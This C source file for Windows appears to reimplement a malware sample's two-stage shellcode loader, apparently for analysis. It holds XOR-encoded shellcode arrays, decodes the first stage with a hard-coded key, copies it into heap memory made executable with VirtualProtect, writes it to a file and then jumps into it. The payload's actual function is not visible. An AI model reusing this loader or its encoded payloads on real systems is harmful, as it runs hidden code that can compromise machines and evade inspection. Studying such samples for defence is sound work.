#include <stdio.h>
#include<windows.h>
HANDLE own_handle;
HANDLE heap;
HANDLE heap;
LPVOID heap_addr_1;
LPVOID heap_addr_2;
LPVOID heap_allocation_1;
PVOID *heap_key_addr;
LPVOID heap_first_stage_address;
PVOID pointer_second_stage_payload;


#pragma comment(linker, "/INCREMENTAL:YES")
char second_stage_payload[221]="\x29\x50\x9e\x29\x96\x86\x4\x29\xea\x39\x1\x29\xea\x3a\x79\x29\xea\x3a\x41\x29\xea\x7a\x29\xea\x7a\x29\xea\x3a\x41\x28\xe8\xb9\xea\x3a\x5d\x2d\x60\xa2\x29\x50\xa8\x7\xe0\xa0\x9e\xe9\x29\xa0\x88\x69\xea\x75\x6a\x2d\x60\xa3\x2c\x50\xb3\x25\xea\x33\x7d\x2c\x60\xa3\x2c\x50\xba\x25\xea\x3b\x41\x2c\x60\xa2\x2c\x50\x85\x25\xea\x3\x45\x2c\x60\xa5\x8a\x53\x3a\x38\x29\x50\xa1\x29\xe8\x83\x30\x29\xea\x6d\x45\x29\x50\x9e\x20\xea\x5d\xe2\x2d\x60\xa6\x29\xe8\xb7\x92\xc7\x15\x64\x29\x9e\xa1\x8a\x87\x38\x7\x20\xea\x65\x25\x20\xea\x65\xe3\x2d\x60\xa1\x32\xa2\x29\x50\xa8\xe1\xa0\x66\x29\xd9\x6e\xc9\xf7\xf0\xdb\xe6\xfb\xfd\x29\x96\xb1\x29\xa0\x89\x69\x31\x30\x89\xd1\x9e\x9e\x9e\x28\xe8\xa7\x29\x50\xa8\x29\x96\x80\x31\x29\xd9\xfd\xff\xf2\xfd\xb0\xfb\xe6\xfb\x29\x96\xb1\x31\x29\xe8\x80\x29\x9e\xa3\x29\xe2\x8d\x41\x20\x9e\xb7\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\xe9";
char first_stage_payload[221]="\x3c\x54\x8c\x3c\xa8\x8c\x0\x31\xff\x3d\x13\x3c\xd4\x30\x7d\x31\xff\x3e\x53\x3c\xd4\x70\x2d\xf2\x6f\x2d\xf8\x2f\x7f\x22\xec\xa1\xff\x3e\x4f\x38\x5e\xa8\x2d\x48\xbd\x3\xf2\xb5\xa0\xe3\x2d\xb8\x9d\x6d\xf8\x60\x54\x27\x64\xbb\x39\x54\xa1\x30\xd4\x39\x79\x34\x75\xa7\x3e\x45\x84\x2f\xee\x23\x54\x28\x72\xb7\x12\x5a\x81\x3d\xff\x7\x57\x39\x5e\xaf\x8e\x4b\x2f\x3c\x3b\x45\x9f\x23\xec\x9b\x25\x2d\xf8\x78\x7b\x23\x54\x86\x35\xee\x4f\xf7\x13\x6a\xa2\x31\xfd\xb3\x80\xd2\x2b\x6e\x2d\x86\xb4\x8e\x95\x2d\x39\x2a\xee\x7d\x30\x24\xf8\x70\xdd\x27\x64\xb9\x27\xa6\x3b\x45\x96\xeb\xa4\x7e\x3c\xdd\x7c\xdc\xc9\xfa\xdf\xfe\xee\xf9\x3b\x83\x8f\x23\xa4\x91\x7c\x35\x22\x9c\xef\x94\x9a\x86\x3d\xec\xb5\x3c\x6e\xa2\x2d\x8e\x95\x35\x3b\xcc\xc3\xf5\xf6\xe5\xa5\xff\xf4\xee\x17\x9c\xb5\x29\x3c\xec\x92\x3c\xa0\xa9\x2d\xfa\x98\x45\x32\x8b\x89";
char placeholder[]="\xE9";




VOID alloc_heap()
{
    heap_addr_1 = HeapCreate(0, 0x1000u, 0);
    heap_allocation_1 = HeapAlloc(heap_addr_1, 0, 16u);
}


VOID create_heap()
{
    heap_addr_2  = HeapCreate(0, 0x1000u, 0);
}

WORD *__stdcall copy_global_to_heap(char *pointer, char *string, int char_number)
{
    //This is an unnecessary complex function to copy the content of a string into another
    WORD *result; // eax
    WORD *array_addr; // [esp+0h] [ebp-4h]

    array_addr = (WORD *)pointer + char_number;
    while ( char_number > 0 )
    {
        *pointer++ = *string++;
        char_number -= 1;
    }
    result = array_addr;
    return result;
}

int __stdcall copy_key_to_heap(LPVOID *heap_pointer, char *key)
{
    int strlen = wcslen(key);
    *heap_pointer  = HeapAlloc(heap_addr_1, 0, 2 * strlen + 10);
    copy_global_to_heap(*heap_pointer, key, strlen);

    return 2 * strlen + 2;
}



void *__stdcall memmove_wrapper(void *a1, void *Src, size_t Size)
{
    return memmove(a1, Src, Size);
}

int __stdcall decode(char* encoded_data, int encoded_data_len, char *heap_str_addr)
{
    for(int i=0;i<encoded_data_len;i++)
    {
        encoded_data[i]=encoded_data[i]^heap_str_addr[i%strlen(heap_str_addr)];
    }
    return 0;
}

LPVOID __stdcall create_second_heap(int dwBytes)
{
    return HeapAlloc(heap_addr_2, 8u, dwBytes);
}

void main()
{
    memset(&heap, 0, 0x24u);
    own_handle = GetModuleHandleW(0);
    heap = HeapCreate(0, 0x1000u, 0);
    alloc_heap();
    create_heap();
    DWORD flOldProtect;
    copy_key_to_heap(&heap_key_addr,"test_key");
    int second_stage_lenght=first_stage_payload-second_stage_payload;
    int first_stage_lenght=placeholder-first_stage_payload;

    decode(first_stage_payload, first_stage_lenght, heap_key_addr);
    heap_first_stage_address = create_second_heap(first_stage_lenght);
    VirtualProtect(heap_first_stage_address, first_stage_lenght, 0x40u, &flOldProtect);
    memmove_wrapper(heap_first_stage_address, &first_stage_payload, first_stage_lenght);
    //decode(second_stage_payload, second_stage_lenght, heap_key_addr);

    //write decrypted payload to file for inspection
    FILE *fptr=fopen("first.dat","wb");
    fwrite(heap_first_stage_address,first_stage_lenght,1,fptr);
    fclose(fptr);

    //in the original implementation, the address and lenght of the second stage payload is passed to the call of the first
    //in my case, I will not use it in any way
    //((void (__stdcall *)(char*,int))heap_first_stage_address)(pointer_second_stage_payload,first_stage_lenght);
    ((void (__stdcall *)())heap_first_stage_address)();

    ExitProcess(0);

}
